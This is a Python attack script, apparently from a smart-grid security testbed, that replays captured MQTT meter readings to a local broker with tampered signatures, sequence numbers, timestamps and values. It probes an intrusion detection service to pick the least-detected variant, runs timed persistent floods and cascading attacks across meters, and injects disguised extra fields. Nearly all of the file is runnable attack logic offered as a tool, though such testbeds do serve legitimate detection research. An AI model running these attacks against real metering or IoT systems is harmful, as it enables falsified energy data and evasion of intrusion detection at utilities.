#!/usr/bin/env python3
"""
Hybrid Attack Attacker - Combines multiple attack vectors for sophisticated attacks
"""

import os
import json
import time
import argparse
import random
import threading
import requests
from typing import List, Dict, Any, Tuple
import paho.mqtt.client as mqtt
from eth_account import Account
from eth_account.messages import encode_defunct

# Config
DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "grid/readings"
CAPTURE_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data", "captures.json"))
IDS_URL = "http://127.0.0.1:5100/check"
BACKEND_URL = "http://127.0.0.1:5000/submitReading"

class HybridAttackAttacker:
    def __init__(self, broker=DEFAULT_BROKER, port=DEFAULT_PORT, topic=DEFAULT_TOPIC):
        self.broker = broker
        self.port = port
        self.topic = topic
        self.captures = self.load_captures()
        self.attack_history = []
        self.successful_attacks = []
        
    def load_captures(self) -> List[Dict[str, Any]]:
        if not os.path.exists(CAPTURE_FILE):
            return []
        with open(CAPTURE_FILE, "r") as f:
            return json.load(f)
    
    def probe_system(self, payload: dict) -> Dict[str, Any]:
        """Probe both IDS and backend to understand system behavior"""
        results = {
            "ids": {"suspicious": False, "score": 0.0, "reasons": []},
            "backend": {"ok": False, "error": "unknown"}
        }
        
        # Probe IDS
        try:
            ids_response = requests.post(IDS_URL, json={"reading": payload, "last_seq": 0}, timeout=2)
            if ids_response.status_code == 200:
                results["ids"] = ids_response.json()
        except Exception as e:
            print(f"[HYBRID] IDS probe failed: {e}")
        
        # Probe backend
        try:
            backend_response = requests.post(BACKEND_URL, json=payload, timeout=2)
            results["backend"] = backend_response.json()
        except Exception as e:
            print(f"[HYBRID] Backend probe failed: {e}")
        
        return results
    
    def signature_sequence_hybrid_attack(self, payload: dict):
        """Combine signature manipulation with sequence attacks"""
        # First, manipulate signature
        original_sig = payload.get("signature", "")
        if original_sig:
            # Truncate signature
            payload["signature"] = original_sig[:len(original_sig)//2] + "0" * (len(original_sig) - len(original_sig)//2)
        
        # Then manipulate sequence
        payload["seq"] = payload.get("seq", 0) + 100  # Large gap
        
        return payload
    
    def timing_value_hybrid_attack(self, payload: dict):
        """Combine timing manipulation with value modification"""
        # Manipulate timestamp
        payload["ts"] = int(time.time()) - 300  # 5 minutes ago
        
        # Modify value significantly
        original_value = payload.get("value", 0)
        payload["value"] = original_value * 10  # 10x increase
        
        return payload
    
    def multi_vector_coordinated_attack(self, payloads: List[dict]):
        """Coordinate multiple attack vectors simultaneously"""
        attack_threads = []
        
        # Signature bypass thread
        sig_payload = payloads[0].copy()
        sig_payload["signature"] = sig_payload.get("signature", "") + "00"
        attack_threads.append(threading.Thread(target=self.publish_attack, args=(sig_payload, "sig_bypass")))
        
        # Sequence manipulation thread
        seq_payload = payloads[0].copy()
        seq_payload["seq"] = seq_payload.get("seq", 0) - 1  # Rollback
        attack_threads.append(threading.Thread(target=self.publish_attack, args=(seq_payload, "seq_manip")))
        
        # Value manipulation thread
        val_payload = payloads[0].copy()
        val_payload["value"] = val_payload.get("value", 0) * 100  # Extreme value
        attack_threads.append(threading.Thread(target=self.publish_attack, args=(val_payload, "val_manip")))
        
        # Start all attacks simultaneously
        for thread in attack_threads:
            thread.start()
        
        # Wait for completion
        for thread in attack_threads:
            thread.join()
    
    def adaptive_hybrid_attack(self, payload: dict):
        """Adaptively combine attacks based on system responses"""
        original_payload = payload.copy()
        
        # Test different attack combinations
        attack_combinations = [
            {"sig_mod": True, "seq_mod": False, "val_mod": False},
            {"sig_mod": False, "seq_mod": True, "val_mod": False},
            {"sig_mod": False, "seq_mod": False, "val_mod": True},
            {"sig_mod": True, "seq_mod": True, "val_mod": False},
            {"sig_mod": True, "seq_mod": False, "val_mod": True},
            {"sig_mod": False, "seq_mod": True, "val_mod": True},
            {"sig_mod": True, "seq_mod": True, "val_mod": True},
        ]
        
        best_attack = None
        best_score = 0
        
        for combo in attack_combinations:
            test_payload = original_payload.copy()
            
            if combo["sig_mod"]:
                test_payload["signature"] = test_payload.get("signature", "") + "00"
            
            if combo["seq_mod"]:
                test_payload["seq"] = test_payload.get("seq", 0) + 50
            
            if combo["val_mod"]:
                test_payload["value"] = test_payload.get("value", 0) * 5
            
            # Test this combination
            results = self.probe_system(test_payload)
            
            # Score based on detection (lower detection = higher score)
            ids_score = results["ids"].get("score", 0)
            backend_ok = results["backend"].get("ok", False)
            
            attack_score = (1 - ids_score) + (1 if backend_ok else 0)
            
            if attack_score > best_score:
                best_score = attack_score
                best_attack = test_payload
        
        if best_attack:
            print(f"[HYBRID] Best attack score: {best_score}")
            self.publish_attack(best_attack)
            return best_attack
        
        return original_payload
    
    def persistence_attack(self, payload: dict, duration_minutes: int = 5):
        """Persistent attack that adapts over time"""
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        
        attack_count = 0
        successful_count = 0
        
        while time.time() < end_time:
            # Vary attack parameters
            attack_payload = payload.copy()
            
            # Random modifications
            modifications = [
                lambda p: {**p, "value": p.get("value", 0) * random.uniform(0.5, 2.0)},
                lambda p: {**p, "seq": p.get("seq", 0) + random.randint(1, 10)},
                lambda p: {**p, "ts": int(time.time()) + random.randint(-60, 60)},
                lambda p: {**p, "signature": p.get("signature", "") + "00"},
            ]
            
            # Apply random modifications
            for mod in random.sample(modifications, random.randint(1, 3)):
                attack_payload = mod(attack_payload)
            
            # Test and publish
            results = self.probe_system(attack_payload)
            self.publish_attack(attack_payload)
            
            attack_count += 1
            if results["backend"].get("ok", False):
                successful_count += 1
            
            # Adaptive delay based on success rate
            success_rate = successful_count / attack_count if attack_count > 0 else 0
            delay = 2 if success_rate > 0.5 else 5  # Slower if detected more
            
            time.sleep(delay)
        
        print(f"[HYBRID] Persistence attack completed: {successful_count}/{attack_count} successful")
    
    def stealth_injection_attack(self, payload: dict):
        """Stealthy injection that appears legitimate"""
        # Create payload that looks normal but contains malicious data
        stealth_payload = payload.copy()
        
        # Add hidden fields that might not be validated
        stealth_payload["metadata"] = {
            "version": "1.0",
            "checksum": "legitimate_looking_hash",
            "extra_data": "malicious_payload_hidden_here"
        }
        
        # Modify values slightly to stay under radar
        stealth_payload["value"] = round(stealth_payload.get("value", 0) * 1.001, 2)
        
        return stealth_payload
    
    def cascade_failure_attack(self, payloads: List[dict]):
        """Create cascade failures across multiple meters"""
        # Sort payloads by meter
        meters = {}
        for payload in payloads:
            meter_id = payload.get("meterID")
            if meter_id not in meters:
                meters[meter_id] = []
            meters[meter_id].append(payload)
        
        # Attack each meter in sequence to create cascade
        for meter_id, meter_payloads in meters.items():
            print(f"[HYBRID] Cascading attack on meter {meter_id}")
            
            # Send multiple attacks to this meter
            for i, payload in enumerate(meter_payloads[:3]):  # Limit to 3 per meter
                modified_payload = payload.copy()
                modified_payload["seq"] = payload.get("seq", 0) + i * 100
                modified_payload["value"] = payload.get("value", 0) * (i + 1)
                
                self.publish_attack(modified_payload)
                time.sleep(0.5)
            
            # Wait between meters
            time.sleep(2)
    
    def publish_attack(self, payload: dict, attack_type: str = "hybrid"):
        """Publish the attack payload"""
        client = mqtt.Client(client_id=f"hybrid_{attack_type}_{int(time.time()*1000)}")
        client.connect(self.broker, self.port, 60)
        client.loop_start()
        
        payload_str = json.dumps(payload, separators=(",", ":"), sort_keys=False)
        client.publish(self.topic, payload_str)
        
        time.sleep(0.2)
        client.loop_stop()
        client.disconnect()
        
        # Record attack
        attack_record = {
            "timestamp": time.time(),
            "payload": payload,
            "attack_type": attack_type
        }
        self.attack_history.append(attack_record)
        
        print(f"[HYBRID] Published {attack_type}: meter={payload.get('meterID')} seq={payload.get('seq')}")
    
    def run_hybrid_attacks(self, attack_type: str = "all", target_meter: str = None):
        """Run various hybrid attacks"""
        if not self.captures:
            print("No captures available for hybrid attacks")
            return
        
        # Filter captures by meter if specified
        target_captures = self.captures
        if target_meter:
            target_captures = [c for c in self.captures if c["payload"].get("meterID") == target_meter]
        
        if not target_captures:
            print(f"No captures found for meter {target_meter}")
            return
        
        attacks = {
            "signature_sequence": lambda: self.signature_sequence_hybrid_attack(target_captures[0]["payload"].copy()),
            "timing_value": lambda: self.timing_value_hybrid_attack(target_captures[0]["payload"].copy()),
            "multi_vector": lambda: self.multi_vector_coordinated_attack([c["payload"] for c in target_captures[:3]]),
            "adaptive": lambda: self.adaptive_hybrid_attack(target_captures[0]["payload"].copy()),
            "persistence": lambda: self.persistence_attack(target_captures[0]["payload"].copy(), 2),
            "stealth": lambda: self.stealth_injection_attack(target_captures[0]["payload"].copy()),
            "cascade": lambda: self.cascade_failure_attack([c["payload"] for c in target_captures]),
        }
        
        if attack_type == "all":
            for attack_name, attack_func in attacks.items():
                print(f"[HYBRID] Running {attack_name} attack...")
                attack_func()
                time.sleep(3)
        elif attack_type in attacks:
            print(f"[HYBRID] Running {attack_type} attack...")
            attacks[attack_type]()
    
    def generate_attack_report(self):
        """Generate a report of all attacks performed"""
        if not self.attack_history:
            print("No attacks performed yet")
            return
        
        print("\n" + "="*50)
        print("HYBRID ATTACK REPORT")
        print("="*50)
        print(f"Total attacks performed: {len(self.attack_history)}")
        
        # Group by attack type
        attack_types = {}
        for attack in self.attack_history:
            attack_type = attack["attack_type"]
            if attack_type not in attack_types:
                attack_types[attack_type] = 0
            attack_types[attack_type] += 1
        
        print("\nAttack types:")
        for attack_type, count in attack_types.items():
            print(f"  {attack_type}: {count}")
        
        print("\nRecent attacks:")
        for attack in self.attack_history[-5:]:  # Last 5 attacks
            payload = attack["payload"]
            print(f"  {time.ctime(attack['timestamp'])}: {attack['attack_type']} - meter={payload.get('meterID')} seq={payload.get('seq')}")

def main():
    parser = argparse.ArgumentParser(description="Hybrid Attack Attacker")
    parser.add_argument("--broker", default=DEFAULT_BROKER)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--topic", default=DEFAULT_TOPIC)
    parser.add_argument("--attack", choices=["signature_sequence", "timing_value", "multi_vector", 
                                            "adaptive", "persistence", "stealth", "cascade", "all"], 
                       default="all", help="Type of hybrid attack")
    parser.add_argument("--target-meter", help="Target meter ID for attacks")
    parser.add_argument("--duration", type=int, default=2, help="Duration for persistence attacks (minutes)")
    parser.add_argument("--confirm", action="store_true", help="Required to execute attacks")
    parser.add_argument("--report", action="store_true", help="Generate attack report")
    
    args = parser.parse_args()
    
    if not args.confirm:
        print("Hybrid attacks require --confirm")
        return
    
    attacker = HybridAttackAttacker(args.broker, args.port, args.topic)
    
    if args.report:
        attacker.generate_attack_report()
    else:
        attacker.run_hybrid_attacks(args.attack, args.target_meter)

if __name__ == "__main__":
    main()